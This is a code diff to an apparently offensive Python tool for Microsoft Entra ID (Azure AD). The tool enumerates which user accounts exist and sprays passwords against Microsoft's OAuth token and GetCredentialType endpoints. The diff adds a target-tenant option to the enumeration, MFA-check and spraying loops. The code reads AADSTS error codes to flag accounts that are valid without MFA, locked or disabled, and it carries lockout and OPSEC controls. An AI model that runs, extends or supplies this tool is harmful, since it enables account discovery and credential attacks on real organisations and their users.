@@ -41,8 +41,8 @@ BG_GRAY = "\033[100m"
 
 # ==================== CONSTANTS ====================
 
-CREDENTIAL_TYPE_URL = "https://login.microsoftonline.com/common/GetCredentialType"
-OAUTH_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/token"
+CREDENTIAL_TYPE_URL = "https://login.microsoftonline.com/{tenant}/GetCredentialType"
+OAUTH_TOKEN_URL = "https://login.microsoftonline.com/{tenant}/oauth2/token"
 AZURE_PS_CLIENT_ID = "1b730954-1685-4b74-9bfd-dac224a7b894"
 
 HEADERS = {
@@ -239,6 +239,8 @@ def parse_args():
                         help="Stop after N lockouts detected (default: 3, 0=disable)")
     parser.add_argument("--force", action="store_true",
                         help="Continue on lockouts (overrides --max-lockouts)")
+    parser.add_argument("-t", "--tenant", default="common",
+                        help="Target tenant domain or ID (default: common)")
     parser.add_argument("-o", "--outfile", help="Write results to file")
     parser.add_argument("--json", action="store_true", help="Output as JSON")
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
@@ -276,7 +278,7 @@ def load_list(path, desc):
 
 # ==================== CORE AUTH FUNCTION ====================
 
-def oauth_attempt(email, password):
+def oauth_attempt(email, password, tenant="common"):
     data = {
         "resource": "https://graph.windows.net",
         "client_id": AZURE_PS_CLIENT_ID,
@@ -286,15 +288,16 @@ def oauth_attempt(email, password):
         "scope": "openid",
     }
 
+    url = OAUTH_TOKEN_URL.format(tenant=tenant)
     try:
-        r = requests.post(OAUTH_TOKEN_URL, data=data, headers=OAUTH_HEADERS, timeout=10)
+        r = requests.post(url, data=data, headers=OAUTH_HEADERS, timeout=10)
 
         if r.status_code == 200:
             return "VALID_NO_MFA", "Authentication successful — account has NO MFA protection"
 
         body = r.text
         code_map = [
-            ("AADSTS50034", "NOT_FOUND",        "User does not exist in this tenant"),
+            ("AADSTS50034", "NOT_FOUND",        f"User does not exist in tenant '{tenant}'"),
             ("AADSTS50126", "INVALID_PASS",      "Password is incorrect"),
             ("AADSTS50079", "VALID_MFA",         "Valid credentials — MFA required (Authenticator/SMS/TOTP)"),
             ("AADSTS50076", "VALID_MFA",         "Valid credentials — MFA required"),
@@ -302,8 +305,8 @@ def oauth_attempt(email, password):
             ("AADSTS50053", "LOCKED",            "Account locked by Smart Lockout — too many failed attempts"),
             ("AADSTS50057", "DISABLED",          "Account is disabled by admin"),
             ("AADSTS50055", "EXPIRED",           "Password has expired — needs reset"),
-            ("AADSTS50128", "TENANT_NOT_FOUND",  "Tenant/domain does not exist"),
-            ("AADSTS50059", "TENANT_NOT_FOUND",  "Tenant/domain does not exist"),
+            ("AADSTS50128", "TENANT_NOT_FOUND",  f"Tenant '{tenant}' does not exist"),
+            ("AADSTS50059", "TENANT_NOT_FOUND",  f"Tenant '{tenant}' does not exist"),
         ]
 
         for aad_code, status, detail in code_map:
@@ -318,7 +321,7 @@ def oauth_attempt(email, password):
 
 # ==================== ENUM FUNCTIONS ====================
 
-def enum_getcredentialtype(email):
+def enum_getcredentialtype(email, tenant="common"):
     payload = {
         "Username": email,
         "IsOtherIdpSupported": True,
@@ -331,31 +334,32 @@ def enum_getcredentialtype(email):
         "Flowtoken": "",
     }
 
+    url = CREDENTIAL_TYPE_URL.format(tenant=tenant)
     try:
-        r = requests.post(CREDENTIAL_TYPE_URL, json=payload, headers=HEADERS, timeout=10)
+        r = requests.post(url, json=payload, headers=HEADERS, timeout=10)
         data = r.json()
 
         if_exists = data.get("IfExistsResult", -1)
         throttle = data.get("ThrottleStatus", 0)
 
-        if throttle == 1:
-            return "THROTTLED", "Rate limited by Microsoft — slow down", data
-
         if if_exists in (0, 5, 6):
             domain_type = data.get("EstsProperties", {}).get("DomainType", None)
             fed = " (federated IdP — ADFS/Okta/etc)" if domain_type == 4 else " (managed — cloud auth)"
-            return "EXISTS", f"User exists in tenant{fed}", data
+            return "EXISTS", f"User exists in tenant '{tenant}'{fed}", data
         elif if_exists == 1:
-            return "NOT_FOUND", "User does not exist in this tenant", data
-        else:
-            return "UNKNOWN", f"Unexpected IfExistsResult={if_exists}", data
+            return "NOT_FOUND", f"User does not exist in tenant '{tenant}'", data
+
+        if throttle == 1:
+            return "THROTTLED", "Rate limited by Microsoft — slow down", data
+
+        return "UNKNOWN", f"Unexpected IfExistsResult={if_exists}", data
 
     except requests.RequestException as e:
         return "NETWORK_ERROR", str(e), None
 
 
-def enum_oauth(email):
-    status, detail = oauth_attempt(email, "InvalidPasswordForEnumOnly_X9k!mZ")
+def enum_oauth(email, tenant="common"):
+    status, detail = oauth_attempt(email, "InvalidPasswordForEnumOnly_X9k!mZ", tenant)
     exists_statuses = ("INVALID_PASS", "VALID_MFA", "VALID_CA_MFA", "VALID_NO_MFA",
                        "LOCKED", "DISABLED", "EXPIRED")
     if status in exists_statuses:
@@ -605,6 +609,7 @@ def main():
     print_separator("─", DIM)
     print(f"  {BOLD}MODE{RST}      {CYAN}{mode_labels[mode_key]}{RST}")
     print(f"  {BOLD}METHOD{RST}    {method}")
+    print(f"  {BOLD}TENANT{RST}    {CYAN}{args.tenant}{RST}")
     print(f"  {BOLD}OPSEC{RST}     {opsec_label}")
     print(f"  {BOLD}TARGETS{RST}   {len(emails)} email(s)")
     if passwords:
@@ -627,9 +632,9 @@ def main():
     if args.enum:
         for i, email in enumerate(emails):
             if args.oauth:
-                status, detail, raw = enum_oauth(email)
+                status, detail, raw = enum_oauth(email, args.tenant)
             else:
-                status, detail, raw = enum_getcredentialtype(email)
+                status, detail, raw = enum_getcredentialtype(email, args.tenant)
 
             print_result(email, status, detail, counter=i+1, total=len(emails))
             results.append({"email": email, "status": status, "detail": detail})
@@ -643,7 +648,7 @@ def main():
     # ========== MFA CHECK MODE ==========
     elif args.mfa:
         for i, email in enumerate(emails):
-            status, detail = oauth_attempt(email, args.password)
+            status, detail = oauth_attempt(email, args.password, args.tenant)
             print_result(email, status, detail, password=args.password, counter=i+1, total=len(emails))
             results.append({"email": email, "password": args.password, "status": status, "detail": detail})
 
@@ -669,7 +674,7 @@ def main():
                     break
 
                 attempt += 1
-                status, detail = oauth_attempt(email, password)
+                status, detail = oauth_attempt(email, password, args.tenant)
 
                 if is_interesting(status) or args.verbose:
                     print_result(email, status, detail, password=password,
@@ -741,7 +746,7 @@ def main():
                     break
 
                 attempt += 1
-                status, detail = oauth_attempt(email, password)
+                status, detail = oauth_attempt(email, password, args.tenant)
 
                 if is_interesting(status) or args.verbose:
                     print_result(email, status, detail, password=password,
